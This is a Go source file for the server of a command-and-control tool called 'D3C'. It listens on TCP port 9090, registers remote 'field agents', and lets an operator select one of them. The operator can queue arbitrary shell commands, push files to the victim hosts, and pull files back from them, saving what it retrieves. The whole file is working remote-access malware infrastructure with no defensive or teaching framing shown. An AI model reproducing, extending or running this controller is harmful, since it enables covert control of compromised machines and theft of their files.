package main

import (
	"bufio"
	"encoding/gob"
	"global"
	"helpers"
	"log"
	"net"
	"os"
	"strings"
)

var (
	fieldAgents   = []global.Message{}
	selectedAgent = ""
)

func main() {
	log.Println("Execution started")

	go startListener("9090")

	cliHandler()
}

func cliHandler() {
	for {
		if selectedAgent != "" {
			print(selectedAgent + "@D3C# ")
		} else {
			print("D3C> ")
		}

		reader := bufio.NewReader(os.Stdin)
		fullCommand, _ := reader.ReadString('\n')

		separateCommand := helpers.CommandsSplit(fullCommand)
		baseCommando := separateCommand[0]

		if len(baseCommando) > 0 {
			switch baseCommando {
			case "show":
				showHandler(separateCommand)
			case "sleep":
				sleep(fullCommand)
			case "select":
				selectHandler(separateCommand)
			case "send":
				sendFile(separateCommand)
			case "get":
				getFile(fullCommand)
			default:
				if selectedAgent != "" {
					command := &global.Command{}
					command.Request = fullCommand

					for i, v := range fieldAgents {
						if v.AgentID == selectedAgent {
							// ADD request commando for this agent
							fieldAgents[i].Commands = append(fieldAgents[i].Commands, *command)
						}
					}

				} else {
					log.Println("Non-existent command!")
				}
			}
		}
	}
}

func agentRegistration(agentID string) (registered bool) {
	registered = false

	for _, v := range fieldAgents {
		if v.AgentID == agentID {
			registered = true
		}
	}

	return registered
}

func commandResponse(message global.Message) (contains bool) {
	contains = false

	for _, v := range message.Commands {
		if len(v.Response) > 0 {
			contains = true
		}
	}

	return contains
}

func agentFieldPosition(agentID string) (position int) {
	for i, v := range fieldAgents {
		if v.AgentID == agentID {
			position = i
		}
	}

	return position
}

func startListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)

	if err != nil {
		log.Fatal("Error starting listener: ", err.Error())
	} else {

		for {
			channel, e := listener.Accept()
			defer channel.Close()

			if e != nil {
				log.Println("Error on a new channel: ", e.Error())
			} else {
				message := &global.Message{}

				gob.NewDecoder(channel).Decode(message)

				// Agent registration verification
				if agentRegistration(message.AgentID) {

					if commandResponse(*message) {
						log.Println("Host Message: ", message.AgentHostname)

						//Print response
						for i, v := range message.Commands {
							log.Println("Command: ", v.Request)
							println(v.Response)

							if helpers.CommandsSplit(v.Request)[0] == "get" &&
								message.Commands[i].File.Error == false {
								saveFile(message.Commands[i].File)
							}
						}
					}
					// Send queue commands to agent
					gob.NewEncoder(channel).Encode(fieldAgents[agentFieldPosition(message.AgentID)])
					//Clear command list
					fieldAgents[agentFieldPosition(message.AgentID)].Commands = []global.Command{}

				} else {
					log.Println("New connection: ", channel.RemoteAddr().String())
					log.Println("Agent ID: ", message.AgentID)

					fieldAgents = append(fieldAgents, *message)
					gob.NewEncoder(channel).Encode(message)
				}
			}
		}
	}
}

// Commands
func showHandler(command []string) {
	if len(command) > 1 {
		switch command[1] {
		case "agents":
			for _, v := range fieldAgents {
				println("ID Agent: " + v.AgentID + " -> " + v.AgentHostname + "@" + v.AgentCWD)
			}
		default:
			log.Println("The selected parameter does not exist")
		}
	}
}

func sleep(fullCommand string) {
	separateCommand := helpers.CommandsSplit(fullCommand)

	if len(separateCommand) > 1 && selectedAgent != "" {
		commandSend := &global.Command{}
		commandSend.Request = fullCommand

		fieldAgents[agentFieldPosition(selectedAgent)].Commands = append(fieldAgents[agentFieldPosition(selectedAgent)].Commands, *commandSend)
	} else {
		log.Println("Choose how many seconds the agent should wait!")
	}
}

func selectHandler(command []string) {
	if len(command) > 1 {
		if agentRegistration(command[1]) {
			selectedAgent = command[1]
		} else {
			log.Println("The selected agent is not in the field.")
			log.Println("To list agents in the field type: show agents")
		}
	} else {
		selectedAgent = ""
	}
}

func sendFile(separateCommand []string) {
	if len(separateCommand) > 1 && selectedAgent != "" {
		file := &global.File{}
		file.Name = separateCommand[1]

		var err error
		file.Content, err = os.ReadFile(file.Name)

		commandSend := &global.Command{}
		commandSend.Request = separateCommand[0]
		commandSend.File = *file
		if err != nil {
			log.Println("Open file error: ", err.Error())
		} else {
			fieldAgents[agentFieldPosition(selectedAgent)].Commands = append(fieldAgents[agentFieldPosition(selectedAgent)].Commands, *commandSend)
		}

	} else {
		log.Println("Specify the file to be uploaded!")
	}
}

func getFile(fullCommand string) {
	separateCommand := helpers.CommandsSplit(fullCommand)

	if len(separateCommand) > 1 && selectedAgent != "" {

		commandSend := &global.Command{}
		commandSend.Request = fullCommand

		fieldAgents[agentFieldPosition(selectedAgent)].Commands = append(fieldAgents[agentFieldPosition(selectedAgent)].Commands, *commandSend)

	} else {
		log.Println("Specify the file to be download!")
	}
}

func saveFile(file global.File) {
	fileName := strings.Split(file.Name, "/")
	err := os.WriteFile(fileName[len(fileName)-1], file.Content, 0644)

	if err != nil {
		log.Println("Get file error: ", err.Error())
	}
}
